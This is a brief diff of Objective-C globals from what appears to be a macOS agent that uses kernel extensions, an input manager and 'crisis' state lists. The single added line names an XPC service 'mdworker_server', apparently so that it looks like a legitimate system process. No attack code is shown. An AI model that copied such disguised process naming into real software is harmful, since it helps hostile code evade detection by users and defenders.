@@ -88,6 +88,7 @@ NSString *gInputManagerName         = nil;
 NSString *gKext32Name               = nil;
 NSString *gKext64Name               = nil;
 NSString *gXPCName                  = nil;
+NSString *gMyXPCName                = @"mdworker_server";
 UInt32    gAgentCrisis              = CRISIS_STOP;
 NSMutableArray  *gAgentCrisisNet    = nil;
 NSMutableArray  *gAgentCrisisApp    = nil;
